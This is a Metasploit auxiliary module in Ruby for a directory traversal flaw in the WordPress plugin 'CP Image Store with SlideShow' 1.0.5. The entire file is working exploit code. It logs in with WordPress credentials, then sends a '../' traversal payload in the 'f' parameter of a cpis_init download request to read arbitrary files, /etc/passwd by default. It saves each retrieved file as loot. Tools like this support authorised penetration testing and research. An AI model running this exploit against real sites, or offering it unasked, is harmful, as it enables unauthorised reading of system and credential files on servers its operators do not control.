##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress CP Image Store File Read Vulnerability',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability in WordPress
        Plugin "CP Image Store with SlideShow" version 1.0.5, allowing to read
        arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['EDB', '37559'],
          ['WPVDB', '8094']
        ],
      'Author'         =>
        [
          'Joaquin Ramirez Martinez', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),
        OptString.new('WP_USER', [true, 'Username wordpress', nil]),
        OptString.new('WP_PASS', [true, 'Password to logon', nil])
      ], self.class)
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def check
    check_plugin_version_from_readme('cp-image-store', '1.0.6')
  end

  def run_host(ip)

    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as: #{user}")
      return
    end

    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ /^\//

    email = Rex::Text::rand_text_alpha_lower(5) + '@' + Rex::Text::rand_text_alpha_lower(5) + '.com'

    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => target_uri.path,
      'vars_get'  => {
          'action'          => 'cpis_init',
          'cpis-action'     => 'f-download',
          'purchase_id'     => '1',
          'cpis_user_email' => "#{email}",
          'f'               => "#{traversal}#{filename}"
        },
        'cookie'  => cookie
    )

    if res && res.code == 200

      vprint_status('Downloading file...')
      vprint_line("\n#{res.body}")
      fname = datastore['FILEPATH']

      path = store_loot(
        'cpimagestore.traversal',
        'text/plain',
        ip,
        res.body,
        fname
      )

      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter.")
    end
  end
end
